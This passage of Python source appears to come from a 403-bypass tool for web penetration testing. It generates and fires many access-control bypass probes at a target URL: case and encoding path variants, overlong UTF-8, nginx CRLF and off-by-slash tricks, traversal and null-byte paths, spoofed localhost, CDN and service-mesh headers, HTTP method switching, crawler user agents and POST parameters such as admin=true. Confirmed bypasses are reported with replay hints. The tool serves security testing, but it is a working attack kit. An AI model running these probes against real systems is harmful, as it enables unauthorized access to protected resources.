    name = p.lstrip("/")
    seen = set()
    out  = []

    def add(v, d):
        if v not in seen and v != path:
            seen.add(v)
            out.append((v, d))

    add(f"/{name.upper()}/",     "ALL CAPS")
    add(f"/{name.lower()}/",     "all lower")
    add(f"/{name.capitalize()}/","Capitalized")
    add(f"/{name.swapcase()}/",  "Swapped case")
    # Mixed case variants
    if len(name) > 1:
        add(f"/{name[0].upper()}{name[1:]}", "First char upper")
        mixed = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(name))
        add(f"/{mixed}", "Alternating case")
    return out


# ══════════════════════════════════════════════════════════════
#  MODULE 11 — CHAR ENCODING (char_encode)
# ══════════════════════════════════════════════════════════════
def _char_encode_variants(path):
    p    = path.rstrip("/")
    name = p.lstrip("/")
    seen = set()
    out  = []

    def add(v, d):
        if v not in seen and v != path:
            seen.add(v)
            out.append((v, d))

    # URL encoding
    add(f"/{urllib.parse.quote(name)}/",   "URL encoded")
    add(f"/{urllib.parse.quote(name, safe='')}", "Full URL encoded")
    add(f"{p}%252f",                        "Double encoded slash")
    add(f"{p}%2f",                          "Encoded slash")
    add(f"/{urllib.parse.quote(name).upper()}/", "URL encoded upper")

    # Specific char encoding
    if "a" in name:
        add(f"/{name.replace('a', '%61')}", "Encode 'a'")
    if "e" in name:
        add(f"/{name.replace('e', '%65')}", "Encode 'e'")
    if "/" in name:
        add(f"/{name.replace('/', '%2f')}", "Encode slashes")

    # Overlong UTF-8
    add(f"{p}%c0%af",        "Overlong UTF-8 slash")
    add(f"{p}%e0%80%af",     "Extended overlong UTF-8")
    add(f"{p}%ef%bc%8f",     "Unicode fullwidth slash")
    return out


# ══════════════════════════════════════════════════════════════
#  MODULE 12 — NGINX BYPASS (nginx_bypasses)
#  CVE-2021-40346: HAProxy header size smuggling
# ══════════════════════════════════════════════════════════════
def _nginx_bypass_variants(path):
    p    = path.rstrip("/")
    name = p.lstrip("/")
    seen = set()
    out  = []

    def add(v, d):
        if v not in seen and v != path:
            seen.add(v)
            out.append((v, d))

    # Nginx ACL bypass via trailing special chars
    add(f"{p}.", "Nginx trailing dot")
    add(f"{p}%0a", "Nginx newline injection")
    add(f"{p}%0d", "Nginx CR injection")
    add(f"{p}%0d%0a", "Nginx CRLF injection")
    add(f"{p}%20/", "Nginx space-slash")

    # Nginx off-by-slash
    add(f"{p}a/../{name}", "Nginx off-by-slash")
    return out


# ══════════════════════════════════════════════════════════════
#  MODULE 13B — MODERN CDN / EDGE IP HEADERS (2025–2026 additions)
#  Newer platforms (Vercel, Netlify, Render, Fly.io, Railway) and
#  wider CloudFront/Akamai header coverage than the original IP list.
# ══════════════════════════════════════════════════════════════
def _modern_cdn_ip_bypasses():
    return [
        {"t": "X-Forwarded-For: 127.0.0.1, 127.0.0.1",
         "h": {"X-Forwarded-For": "127.0.0.1, 127.0.0.1"}},
        {"t": "X-Forwarded-For: ::1",              "h": {"X-Forwarded-For": "::1"}},
        {"t": "X-Forwarded-For: 0:0:0:0:0:0:0:1",  "h": {"X-Forwarded-For": "0:0:0:0:0:0:0:1"}},
        {"t": "X-Forwarded-For: ::ffff:127.0.0.1", "h": {"X-Forwarded-For": "::ffff:127.0.0.1"}},
        {"t": "X-Forwarded-For: 169.254.169.254",  "h": {"X-Forwarded-For": "169.254.169.254"}},
        {"t": "CloudFront-Viewer-Address: 127.0.0.1:0",
         "h": {"CloudFront-Viewer-Address": "127.0.0.1:0"}},
        {"t": "X-Amz-Cf-Id: bypass",                "h": {"X-Amz-Cf-Id": "bypass"}},
        {"t": "X-Vercel-Forwarded-For: 127.0.0.1",  "h": {"X-Vercel-Forwarded-For": "127.0.0.1"}},
        {"t": "X-Vercel-IP: 127.0.0.1",             "h": {"X-Vercel-IP": "127.0.0.1"}},
        {"t": "X-Netlify-Original-Ip: 127.0.0.1",   "h": {"X-Netlify-Original-Ip": "127.0.0.1"}},
        {"t": "X-Render-Client-Ip: 127.0.0.1",      "h": {"X-Render-Client-Ip": "127.0.0.1"}},
        {"t": "Fly-Client-Ip: 127.0.0.1",           "h": {"Fly-Client-Ip": "127.0.0.1"}},
        {"t": "X-Railway-Client-Ip: 127.0.0.1",     "h": {"X-Railway-Client-Ip": "127.0.0.1"}},
        {"t": "X-Akamai-Client-IP: 127.0.0.1",      "h": {"X-Akamai-Client-IP": "127.0.0.1"}},
        {"t": "Akamai-Origin-Hop: 0",               "h": {"Akamai-Origin-Hop": "0"}},
        {"t": "X-DO-Connecting-IP: 127.0.0.1",      "h": {"X-DO-Connecting-IP": "127.0.0.1"}},
    ]


# ══════════════════════════════════════════════════════════════
#  MODULE 13C — CLIENT-HINT / SEC-FETCH SPOOFING
#  Some bot-mitigation layers relax rules for requests that look
#  like a same-site browser navigation rather than a bare script.
# ══════════════════════════════════════════════════════════════
def _client_hint_bypasses():
    return [
        {"t": "Sec-Fetch-Site: same-origin",  "h": {"Sec-Fetch-Site": "same-origin"}},
        {"t": "Sec-Fetch-Mode: navigate",     "h": {"Sec-Fetch-Mode": "navigate"}},
        {"t": "Sec-Fetch-Dest: document",     "h": {"Sec-Fetch-Dest": "document"}},
        {"t": "Sec-Fetch-User: ?1",           "h": {"Sec-Fetch-User": "?1"}},
        {"t": "Purpose: prefetch",            "h": {"Purpose": "prefetch"}},
        {"t": "X-Moz: prefetch",              "h": {"X-Moz": "prefetch"}},
        {"t": "COMBO: Sec-Fetch same-origin navigate",
         "h": {"Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate",
               "Sec-Fetch-Dest": "document", "Sec-Fetch-User": "?1"}},
    ]


# ══════════════════════════════════════════════════════════════
#  MODULE 13D — REQUEST-MESH / TRACE HEADER SPOOFING
#  Internal service-mesh trace headers some backends implicitly
#  trust as "this came from inside the cluster, already authed".
# ══════════════════════════════════════════════════════════════
def _trace_header_bypasses():
    return [
        {"t": "X-Amzn-Trace-Id: Root=1-00000000-000000000000000000000000",
         "h": {"X-Amzn-Trace-Id": "Root=1-00000000-000000000000000000000000"}},
        {"t": "X-Request-Id: internal-healthcheck",
         "h": {"X-Request-Id": "internal-healthcheck"}},
        {"t": "X-B3-Sampled: 1",              "h": {"X-B3-Sampled": "1"}},
        {"t": "X-Envoy-Internal: true",       "h": {"X-Envoy-Internal": "true"}},
        {"t": "X-Istio-Attributes: bypass",   "h": {"X-Istio-Attributes": "bypass"}},
        {"t": "TE: trailers",                 "h": {"TE": "trailers"}},
        {"t": "Expect: 100-continue",         "h": {"Expect": "100-continue"}},
        {"t": "Content-Type: application/graphql",
         "h": {"Content-Type": "application/graphql"}},
    ]


# ══════════════════════════════════════════════════════════════
#  MODULE 13E — MODERN PATH NORMALIZATION TRICKS
# ══════════════════════════════════════════════════════════════
def _modern_path_variants(path):
    p    = path.rstrip("/")
    name = p.lstrip("/")
    seen = set()
    out  = []

    def add(v, d):
        if v not in seen and v != path:
            seen.add(v)
            out.append((v, d))

    add(f"/....//{name}",        "Double-substitution slash (....//) ")
    add(f"/..\\{name}",          "Backslash traversal (IIS/Windows)")
    add(f"/%u002e%u002e/{name}", "IIS unicode dot-dot (%u002e)")
    add(f"{p}%ef%bb%bf",         "Trailing UTF-8 BOM")
    add(f"{p}%00.png",           "Null byte + benign extension")
    add(f"{p}%00.json",          "Null byte + benign extension (json)")
    add(f"/{name.replace('i','İ')}/",  "Turkish dotted-I case-fold trick")
    add(f"/{name.replace('I','ı')}/",  "Turkish dotless-i case-fold trick")
    return out


# ══════════════════════════════════════════════════════════════
#  MODULE 13 — HAPROXY BYPASS
#  CVE-2021-40346, CVE-2023-45539
# ══════════════════════════════════════════════════════════════
def _haproxy_header_bypasses(path):
    # CVE-2021-40346: oversized Content-Length
    # CVE-2023-45539: # fragment bypass
    name = path.lstrip("/")
    return [
        {"t": "HAProxy CVE-2023-45539: hash fragment",
         "h": {}, "url_suffix": f"#{name}",
         "b": f"Append # to URL: {path}#{name}\nHAProxy may strip fragment and forward to backend"},
    ]


# ══════════════════════════════════════════════════════════════
#  MODULE 14 — HTTP METHODS (http_methods)
# ══════════════════════════════════════════════════════════════
HTTP_METHODS = ["POST", "HEAD", "OPTIONS", "PUT", "PATCH",
                "DELETE", "TRACE", "CONNECT", "PROPFIND",
                "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK",
                "QUERY"]  # QUERY: IETF draft HTTP method (2024/2025) —
                          # some middleboxes/WAF rulesets don't recognize
                          # it yet and fail open or misroute it.

SPECIAL_AGENTS = [
    ("Googlebot",  "Googlebot/2.1 (+http://www.google.com/bot.html)"),
    ("Bingbot",    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"),
    ("curl",       "curl/7.81.0"),
    ("Empty-UA",   ""),
    ("GPTBot",     "Mozilla/5.0 (compatible; GPTBot/1.2; +https://openai.com/gptbot)"),
    ("ClaudeBot",  "Mozilla/5.0 (compatible; ClaudeBot/1.0; +https://www.anthropic.com)"),
]

POST_PAYLOADS = [
    ({},                   "POST: empty body"),
    ({"_method": "GET"},   "POST: _method=GET"),
    ({"debug": "true"},    "POST: debug=true"),
    ({"admin": "true"},    "POST: admin=true"),
    ({"bypass": "true"},   "POST: bypass=true"),
    ({"__proto__": "x"},   "POST: __proto__ pollution probe"),
]


# ══════════════════════════════════════════════════════════════
#  MAIN ENTRY POINT
# ══════════════════════════════════════════════════════════════
def run_bypass(target_url, path, baseline_size, baseline_status=403,
               timeout=7, show_all=False, delay=0, threads=10, skip_event=None):
    if not REQUESTS_AVAILABLE:
        return []

    _local.buf = []
    _local.delay = delay
    try:
        return _run_bypass_inner(target_url, path, baseline_size,
                                  baseline_status, timeout, show_all, threads, skip_event)
    finally:
        _flush_buffer()
        _local.delay = 0


def _run_bypass_inner(target_url, path, baseline_size, baseline_status, timeout, show_all, threads=10, skip_event=None):
    sess     = requests.Session()
    b_status = baseline_status
    b_size   = baseline_size
    bypasses = []
    maybes   = []
    softwalls = []
    display_seen = set()
    display_seen_lk = threading.Lock()
    full_url = target_url.rstrip("/") + path

    # Baseline for the site's plain root ("/"). The X-Original-URL /
    # X-Rewrite-URL / X-Rewrite-URI / COMBO techniques all work by
    # requesting "/" and hoping the header re-routes it internally to
    # `path`. If the front-end ignores the header, the request just
    # falls through to the normal root page — which is very often a
    # 200 all by itself, so it reads as a "bypass" when it's really
    # just root responding. Fetch root once up front so those specific
    # techniques can be checked against it before being confirmed.
    root_status, root_size, _, root_body = _req(sess, target_url, timeout=timeout)
    root_sig = _content_sig(root_size, root_body) if root_status is not None else None

    def check(status, size, technique, url, method="GET", redirect="", burp=None,
              body_text="", is_root_relay=False):
        verdict = _classify(status, size, b_status, b_size)

        if verdict == "redirect":
            # Don't trust a redirect on its own — e.g. an http->https
            # enforcement redirect just bounces back to the same blocked
            # resource and is not a bypass. Follow it once and judge the
            # final response instead.
            loc = _resolve_location(url, redirect)
            if loc:
                fs, fz, floc, fbody = _req(sess, loc, timeout=timeout)
                fverdict = _classify(fs, fz, b_status, b_size)
                if fverdict in ("confirmed", "maybe"):
                    verdict = fverdict
                    technique = f"{technique} (-> {fs} at destination)"
                    body_text = fbody
                else:
                    verdict = None
            else:
                verdict = None

        soft_tag = None
        if verdict == "confirmed":
            # A 200 doesn't mean much if it's an SPA shell that's about to
            # bounce the browser to /login client-side. Downgrade instead
            # of reporting a false [BYPASS!] — this is exactly the kind
            # of hit that looked like a bypass in Burp but wasn't one.
            soft_tag = classify_soft_auth(body_text)
            if soft_tag:
                verdict = "soft"

        if verdict == "confirmed" and is_root_relay and root_sig is not None:
            # This technique's request physically went to "/", trusting the
            # header to redirect it server-side to `path`. If the response
            # is identical to the plain root page, the header was most
            # likely ignored — it's root responding, not `path`. Still
            # shown (some apps do serve the same shell at both), but the
            # confidence score below is capped low so it reads as
            # "verify this one" instead of a clean hit.
            is_root_echo = _content_sig(size, body_text) == root_sig
        else:
            is_root_echo = False

        if verdict == "confirmed":
            # Print EVERY confirmed bypass. Do not deduplicate the terminal
            # output: each confirmed technique is useful to a security tester.
            confidence = _confidence(status, size, method, is_root_relay, is_root_echo)
            _print_bypass(status, method, size, technique, url, redirect, burp=burp,
                          confidence=confidence, is_root_echo=is_root_echo)
            bypasses.append({"status": status, "method": method, "size": size,
                             "technique": technique, "url": url,
                             "redirect": redirect, "burp": burp or "",
                             "confidence": confidence, "root_echo": is_root_echo})
        elif verdict == "soft":
            # Collected silently — not printed to reduce noise
            softwalls.append({"status": status, "method": method, "size": size,
                              "technique": technique, "url": url,
                              "redirect": redirect, "tag": soft_tag})
        elif verdict == "maybe":
            # Collected silently — not printed to reduce noise
            maybes.append({"status": status, "method": method, "size": size,
                           "technique": technique, "url": url,
                           "redirect": redirect, "burp": burp or ""})

    # ── Pre-build all probes into a flat list so we know the total upfront ──
    alt   = (full_url.replace("https://", "http://") if "https://" in full_url
             else full_url.replace("http://", "https://"))
    alt_label = "HTTP instead of HTTPS" if "http://" in alt else "HTTPS instead of HTTP"

    all_header_sets = (
        _header_ip_bypasses() +
        _header_url_bypasses(target_url, path) +
        _header_host_bypasses(target_url) +
        _header_scheme_bypasses(target_url) +
        _header_port_bypasses() +
        _header_misc_bypasses(target_url, path) +
        _modern_cdn_ip_bypasses() +
        _client_hint_bypasses() +
        _trace_header_bypasses()
    )
    all_path_variants = (
        _path_prefix_variants(path) +
        _mid_path_variants(path) +
        _end_path_variants(path) +
        _case_variants(path) +
        _char_encode_variants(path) +
        _nginx_bypass_variants(path) +
        _modern_path_variants(path)
    )
    all_haproxy = _haproxy_header_bypasses(path)

    total_probes = (
        1 +                        # protocol switch
        len(all_header_sets) +
        len(all_path_variants) +
        len(all_haproxy) +
        len(HTTP_METHODS) +
        len(SPECIAL_AGENTS) +
        len(POST_PAYLOADS) +
        1                          # Content-Length: 0
    )

    # Progress bar removed — results only shown after all probes complete

    # ── Build flat task list: (callable, label) ──────────────────────────────
    def _task_proto():
        s, z, loc, bt = _req(sess, alt, timeout=timeout)
        check(s, z, alt_label, alt, redirect=loc,
              burp=f"Change scheme: {alt}", body_text=bt)

    tasks = [_task_proto]

    for hs in all_header_sets:
        def _t(hs=hs):
            req_path = hs.get("p", path)
            url      = target_url.rstrip("/") + req_path
            s, z, loc, bt = _req(sess, url, headers=hs["h"], timeout=timeout)
            check(s, z, hs["t"], url, redirect=loc, burp=hs.get("b"), body_text=bt,
                  is_root_relay=(req_path == "/"))
        tasks.append(_t)

    for variant, desc in all_path_variants:
        def _t(variant=variant, desc=desc):
            url = target_url.rstrip("/") + variant
            s, z, loc, bt = _req(sess, url, timeout=timeout)
            check(s, z, desc, url, redirect=loc, body_text=bt)
        tasks.append(_t)

    for hb in all_haproxy:
        def _t(hb=hb):
            suffix = hb.get("url_suffix", "")
            url    = full_url + suffix
            s, z, loc, bt = _req(sess, url, headers=hb["h"], timeout=timeout)
            check(s, z, hb["t"], url, redirect=loc, burp=hb.get("b"), body_text=bt)
        tasks.append(_t)

    for method in HTTP_METHODS:
        def _t(method=method):
            s, z, loc, bt = _req(sess, full_url, method=method, timeout=timeout)
            check(s, z, f"Method: {method}", full_url, method=method, redirect=loc,
                  burp=f"Change method to: {method} {path} HTTP/1.1", body_text=bt)
        tasks.append(_t)

    for agent_name, agent_str in SPECIAL_AGENTS:
        def _t(agent_name=agent_name, agent_str=agent_str):
            s, z, loc, bt = _req(sess, full_url, headers={"User-Agent": agent_str}, timeout=timeout)
            check(s, z, f"User-Agent: {agent_name}", full_url, redirect=loc,
                  burp=f"User-Agent: {agent_str if agent_str else '(empty)'}", body_text=bt)
        tasks.append(_t)

    for payload, desc in POST_PAYLOADS:
        def _t(payload=payload, desc=desc):
            s, z, loc, bt = _req(sess, full_url, method="POST", data=payload, timeout=timeout)
            body = "&".join(f"{k}={v}" for k, v in payload.items()) if payload else "(empty)"
            check(s, z, desc, full_url, method="POST", redirect=loc,
                  burp=f"POST {path} HTTP/1.1\nBody: {body}", body_text=bt)
        tasks.append(_t)

    def _task_cl0():
        s, z, loc, bt = _req(sess, full_url,
                          headers={"Content-Length": "0",
                                   "Content-Type": "application/x-www-form-urlencoded"},
                          timeout=timeout)
        check(s, z, "Content-Length: 0", full_url, redirect=loc,
              burp="Add headers:\n  Content-Length: 0\n  Content-Type: application/x-www-form-urlencoded",
              body_text=bt)
    tasks.append(_task_cl0)

    # ── Fire all tasks via thread pool (controlled by -t) ────────────────────
    if skip_event and skip_event.is_set():
        return bypasses

    # Buffer/delay set up by run_bypass() on the calling thread — hand the
    # same objects to every pool worker so probes actually share them
    # instead of each worker seeing a blank threading.local().
    shared_buf   = getattr(_local, "buf", None)
    shared_delay = getattr(_local, "delay", 0)

    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(_run_in_pool, shared_buf, shared_delay, t): t
                       for t in tasks}
            try:
                for fut in as_completed(futures):
                    if skip_event and skip_event.is_set():
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                    try:
                        fut.result()
                    except Exception:
                        pass   # individual probe errors are non-fatal
            except KeyboardInterrupt:
                # Without this, leaving cleanup to the `with` block's default
                # __exit__ (a plain shutdown(wait=True)) does NOT cancel the
                # dozens of probes still queued but not yet started — it lets
                # the whole pool drain first, so Ctrl+C looked like it did
                # nothing and -t/-d appeared ignored while the tool kept
                # firing requests for a long time. Cancelling queued futures
                # here means only the (small number of) already-running
                # probes finish, bounded by --timeout, before we exit.
                executor.shutdown(wait=False, cancel_futures=True)
                raise
    except KeyboardInterrupt:
        _p(f"{Y}  [!] Bypass battery for {path} interrupted (Ctrl+C).{X}")
        raise


    # ── Summary ──
    _p(f"{C}{W}  {'─'*72}{X}")
    if bypasses:
        _p(f"{C}{W}  [✓] {len(bypasses)} confirmed bypass(es) for {path}{X}")
    else:
        _p(f"{D}  [-] No confirmed bypasses for {path}{X}")

    if maybes:
        _p(f"{Y}  [?] {len(maybes)} unconfirmed signal(s) for {path} "
           f"(401/500/503 or an unresolved redirect — worth a manual look, "
           f"not counted as a bypass){X}")

    if softwalls:
        _p(f"{M}  [~] {len(softwalls)} soft-auth-wall signal(s) for {path} "
           f"(got a 2xx, but the body looks like a client-side redirect to "
           f"login — verify manually with a real browser/session before "
           f"trusting these as bypasses){X}")

    _p()

    BYPASS_RESULTS.extend(bypasses)
    return bypasses
